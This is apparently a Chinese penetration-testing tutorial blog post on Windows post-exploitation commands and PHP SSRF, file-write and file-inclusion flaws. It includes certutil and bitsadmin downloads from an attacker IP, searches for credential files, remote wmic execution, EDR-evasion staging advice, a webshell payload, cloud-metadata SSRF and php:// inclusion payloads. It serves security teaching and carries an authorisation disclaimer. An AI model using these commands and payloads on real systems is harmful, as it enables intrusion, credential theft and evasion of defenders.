#  2026年渗透测试双线基础：Windows命令与PHP文件/网络函数，从Shell到RCE的实战拆解  
原创 KLSEC
                    KLSEC  昆仑AI安全实验室   2026-10-23 13:46  
  
很多人刚拿下Shell时最兴奋，也最迷茫。弹回来的框是黑的，桌面没有，鼠标动不了，面前只有一行光标。你会敲的第一条命令，决定了接下来十分钟是你拿到域控，还是被管理员踢出去。  
  
这篇文章拆两条线。**Windows线**  
解决“拿到Shell之后怎么活下来、怎么走得更远”；**PHP线**  
解决“看到源码里的file_get_contents  
和curl_exec  
时，怎么判断它是不是一个RCE入口”。两条线的交叉点只有一个：**你敲的每一条命令、审的每一个函数，本质上都是在跟系统的“信任边界”打交道。**  
  
**一、Windows：拿到Shell后的前60秒，别急着乱敲**  
  
图形界面上你能看到的一切——IP、用户、补丁、进程——在Shell里都靠命令重建。但顺序很重要。先搞清“你是谁、你在哪、你能碰到谁”，再谈横向。  
  
**第一组：确认上下文，避免白干。**  
```
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```  
  
whoami /priv  
比whoami  
重要得多。它直接告诉你当前令牌里有没有SeImpersonate  
、SeDebug  
、SeBackup  
这类“提权入口”权限。2026年很多提权链（土豆系列、Potato）的起点就是这几个特权。systeminfo  
的补丁列表是判断目标“新不新”的第一步，但别手动扫——用findstr KB  
过滤，重点看缺失的高危补丁编号。  
  
**第二组：找文件，不是“看目录”。**  
```
dir /a /s /b C:\Users\ 2>nul | findstr /i "config password backup .sql .bak .kdbx"
```  
  
/a  
包含隐藏和系统文件，/s  
递归，/b  
只输出完整路径。2>nul  
把权限报错吞掉，否则屏幕会被拒绝访问  
刷满。这条命令的目标不是“浏览文件”，是**在几分钟内定位到配置文件、备份、密钥库**  
。2026年实战中，开发人员把数据库密码写在web.config  
或.env  
里的情况仍然极其普遍，而运维习惯把备份放在C:\backup  
或用户目录的隐藏文件夹里。  
  
**第三组：文件传输——不要用浏览器，用系统自带的“合法工具”。**  
  
拿到Shell后，你几乎一定要传工具上去。2026年的EDR对certutil  
和bitsadmin  
的监控非常严，但它们仍然是“合法二进制”里最顺手的选择，关键在于**你能不能解释得通流量**  
。  
```
certutil -urlcache -split -f http://10.10.14.7/tool.exe C:\Windows\Temp\tool.exe
bitsadmin /transfer job1 /download /priority foreground http://10.10.14.7/tool.exe C:\Windows\Temp\tool.exe
```  
  
certutil  
的-urlcache  
会留下缓存痕迹，-split  
避免大文件被截断。bitsadmin  
的/transfer  
创建一个BITS任务，在旧环境里仍然可用。但2026年的现实是：**如果你直接把certutil指向公网IP，CrowdStrike或Defender for Endpoint大概率会告警**  
。更安静的做法是先把文件 staging 到内网一台已经控制的主机上，再从内网拉取。流量看起来是“服务器之间的正常同步”，不是“一台终端在下载外部工具”。  
  
**第四组：横向移动——先看路，再迈步。**  
```
arp -a
route print
netstat -ano | findstr "ESTABLISHED"
```  
  
arp -a  
给你同网段的存活邻居，route print  
告诉你这台机器有几个网卡、能不能通往另一个网段，netstat  
的ESTABLISHED  
连接是**现成的跳板关系图**  
——这台机器正在跟谁通信，那个“谁”很可能就是下一跳。  
  
横向执行不用急着上psexec  
。先试wmic  
：  
```
wmic /node:192.168.1.50 process call create "cmd.exe /c whoami > C:\temp\out.txt"
```  
  
wmic  
的远程进程创建依赖目标开放WMI（135端口）和管理员凭证。如果目标打了较新的补丁、WMI被限制，再退到psexec  
或schtasks  
。**先验证凭证是否在目标上有效，再决定用什么协议**  
——这是2026年横向移动的基本纪律，因为盲目psexec  
会留下大量服务创建日志，触发告警的速度比拿到权限快得多。  
  
**二、PHP：文件操作的“读”与“写”，每一步都是RCE的前置**  
  
PHP的渗透测试从来不缺“危险函数”清单。缺的是**理解这些函数在真实代码路径里是怎么被串起来的**  
。  
  
**读：file_get_contents的三种面孔。**  
  
最直接的SSRF入口是：  
```
$url = $_GET['url'];
$content = file_get_contents($url);
echo $content;
```  
  
allow_url_fopen  
开启时（默认开启），file_get_contents  
可以拉取任意http://  
地址。攻击者传?url=http://169.254.169.254/latest/meta-data/  
就能读云元数据。但2026年的实战中，更常见的是**“过滤了一半”的代码**  
：  
```
if (!preg_match("/^http/", $statsURL)) { exit; }
$content = file_get_contents($statsURL);
```  
  
^http  
只校验协议，不校验主机。http://127.0.0.1:8080/admin  
照样能打进去，http://169.254.169.254/  
也照样能读。AVideo的plugin/Live/test.php  
就是这个模式，代码库里明明有isSSRFSafeURL()  
函数（会解析DNS并屏蔽内网段），但这个端点**根本没有调用它**  
。结果是任何能访问该端点的管理员（或通过CSRF触发的管理员浏览器）都能读取云凭证和内网服务响应。  
  
**写：路径拼接的“最后一步”决定了是LFI还是RCE。**  
  
AVideo的另一个漏洞把“写”的杀伤力展示得更清楚。locale/save.php  
的代码是：  
```
$file = $dir . $_POST['flag'] . ".php";
fwrite(fopen($file, "w"), $_POST['code']);
```  
  
flag  
参数被直接拼进路径，没有basename()  
，没有../  
过滤。传flag=../../shell  
，路径就逃出了locale/  
目录，落在Web根目录的父级。code  
参数原样写入文件内容。攻击者写入<?php system($_GET['c']);?>  
，就拿到了一个可执行的WebShell  
。  
  
这个漏洞还有一个被低估的放大器：**端点的CSRF保护是零**  
。SameSite=None  
让跨站POST自动携带管理员会话。攻击者不需要拿到管理员密码，只需要让管理员访问一个恶意页面，表单自动提交，WebShell就写进去了  
。**“写文件”本身不一定是RCE，但当写入路径可控、写入内容可控、写入位置在Web目录内，RCE就是必然结果。**  
  
**包含：include与伪协议——读源码和RCE之间的那条线。**  
  
文件包含漏洞的入门Payload是?file=../../etc/passwd  
，但2026年真正的杀伤力在伪协议。  
  
php://filter/read=convert.base64-encode/resource=index.php  
，把PHP文件以Base64输出，**绕过PHP引擎的执行**  
，直接读源码。读源码的目的不是“看代码”，是找数据库密码、找硬编码密钥、找下一个可利用的入口  
。  
  
php://input  
配合include  
，直接把POST body当作PHP代码执行。条件是allow_url_include=On  
，这个配置在2026年的生产环境里已经少见，但在CTF和内部系统中仍然存在。data://text/plain;base64,...  
同理，把Payload编码在URL里，不需要任何文件落地  
。  
  
文件包含的防御难点在于：**你可以过滤../，但过滤不了php://；你可以禁用allow_url_include，但php://filter是本地协议，不受这个开关影响。**  
 这就是为什么2026年的代码审计清单仍然把include  
、require  
、file_get_contents  
放在“必须追溯输入来源”的第一优先级  
。  
  
**三、两条线的交叉点：2026年的PHP2Shell在提醒什么**  
  
2026年10月，两个潜伏了约14年的PHP内核级漏洞被公开，统称PHP2Shell（CVE-2026-109618 / CVE-2026-109619）。CVSS 9.2，无需认证即可远程代码执行，补丁发布时PoC已经公开，有云厂商在泄露前十小时就监测到数千次攻击尝试  
。  
  
这个事件的意义不在于“又一个RCE”。它说明了一件事：**PHP应用的攻击面不只在你的代码里，还在运行你的代码的那个解释器里。**  
 你审完了file_get_contents  
、审完了include  
、修完了路径遍历，结果PHP运行时本身有一个内存破坏漏洞，前面所有的代码层防御都被绕过了。  
  
对做渗透测试的人来说，这意味着两件事。第一，**指纹识别要精确到PHP小版本**  
，不能停在“PHP 8.x”。第二，**在代码审计之外，要保留一条“已知CVE快速验证”的路径**  
——当目标跑着某个版本的PHP、某个版本的框架，先查这个版本有没有公开的RCE，比从头审代码快得多。  
  
**写在最后**  
  
Windows命令和PHP函数，看起来是两个不相干的技术栈。但它们服务于同一条攻击链：**Windows命令帮你从Shell走到下一个Shell，PHP函数帮你从Web入口走到第一个Shell。**  
  
2026年的变化不在于这些命令或函数的语法——certutil  
还是那个certutil  
，file_get_contents  
还是那个file_get_contents  
。变化在于**EDR盯得更紧了，代码审计对“过滤假设”的审视更严了，而运行时本身的漏洞开始成为绕不过去的变量**  
。PHP2Shell在提醒你：你修好了门，墙可能塌了。  
  
下次你敲下第一条命令、或者看到第一个危险函数的时候，先问自己：**这一步是在扩大攻击面，还是在暴露自己。**  
 命令行的熟练程度决定你能不能活下来，对函数背后信任假设的理解决定你能不能走得更远。  
  
**严正声明**  
  
本文所述所有Windows命令、PHP函数分析及漏洞案例，仅用于**已获得明确书面授权**  
的安全测试、红队演练、代码审计和教育研究场景。靶场环境应部署在隔离网络中。PHP2Shell（CVE-2026-109618/109619）及相关漏洞的验证必须在授权范围内进行，并及时将PHP运行时更新至修复版本（8.3.36 / 8.2.35等）。未授权扫描、测试、攻击行为违反《中华人民共和国网络安全法》第27条及《刑法》第285条，将承担法律责任。技术无罪，边界是法律。  
  
  
